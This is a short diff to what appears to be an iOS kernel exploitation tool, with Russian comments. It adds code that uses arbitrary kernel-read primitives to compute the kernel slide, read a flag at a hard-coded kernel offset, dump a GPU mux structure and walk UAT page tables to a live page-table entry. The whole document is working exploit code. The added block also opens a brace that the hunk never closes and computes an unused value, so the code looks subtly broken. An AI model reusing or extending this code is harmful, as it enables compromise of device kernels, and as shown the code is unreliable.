@@ -5406,8 +5406,21 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
         // 6. UAT walk до живого PTE нашего буфера (VA=0x10000018000 →
         //    half=0, pc=16, pd=0, pt=6). gart+0x288=mux, mux+0x18=UAT user.
         uint64_t mux = kp_untag_ptr(kp_rc_kread64(gart + 0x288));
-        uint64_t uat = kp_untag_ptr(kp_rc_kread64(mux + 0x18));
-        kpNote(r, [NSString stringWithFormat:@"  mux=%#llx uat=%#llx", mux, uat]);
+        kpNote(r, [NSString stringWithFormat:@"  mux=%#llx", mux]);
+        if (kpLooksLikeKernelPointer(mux)) {
+            uint64_t kbase2 = kconstant(base);
+            uint64_t slide2 = kbase2 - 0xfffffff007004000;
+            uint8_t legacyFlag = 0;
+            kreadbuf(kbase2 + 0xab73fb8 - 0xfffffff007004000, &legacyFlag, 1);
+            uint64_t u18 = kp_untag_ptr(kp_rc_kread64(mux + 0x18));
+            uint64_t u10 = kp_untag_ptr(kp_rc_kread64(mux + 0x10));
+            kpNote(r, [NSString stringWithFormat:@"  legacyFlag=%u mux+0x18=%#llx mux+0x10=%#llx", legacyFlag, u18, u10]);
+            // mux дамп целиком (0x20)
+            for (uint32_t o = 0; o < 0x20; o += 8)
+                kpNote(r, [NSString stringWithFormat:@"    mux+%#x = %#llx", o, kp_rc_kread64(mux + o)]);
+            // выбираем ненулевой
+            uint64_t uat = u18 ? u18 : u10;
+            if (!uat && legacyFlag) uat = u10;
         if (kpLooksLikeKernelPointer(uat)) {
             uint64_t L1 = kp_untag_ptr(kp_rc_kread64(uat + 0x28 + 0x08));
             uint64_t L1e = kp_untag_ptr(kp_rc_kread64(L1 + 16 * 8));
